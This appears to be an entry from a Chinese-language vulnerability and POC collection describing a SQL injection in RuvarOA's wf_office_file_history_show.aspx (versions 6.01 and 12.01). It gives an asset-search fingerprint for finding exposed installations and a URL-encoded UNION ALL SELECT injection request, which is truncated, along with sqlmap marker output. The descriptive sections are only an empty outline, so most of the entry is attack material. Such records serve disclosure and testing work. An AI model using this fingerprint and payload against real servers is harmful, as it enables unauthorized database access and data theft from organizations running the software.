# RuvarOAwf_office_file_history_show存在SQL注入漏洞

- **系统**：RuvarOAwf　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`GET /WorkFlow/wf_office_file_history_show.aspx?id=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28114%29%2BCHAR%28111%29%2BCHAR%2886%29%2BCHAR%2887%29%2BCHA`

**请求体 / payload**
```
qjpbqroVWIsXMoxGhjRFCwiSBxdZmraQOrhmaESxsWVpNqzpkq
sqlmap
GET /WorkFlow/wf_office_file_history_show.aspx?id=1 HTTP/1.1
Host:
```

**其他**
- RuvarOA wf\_office\_file\_history\_show存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01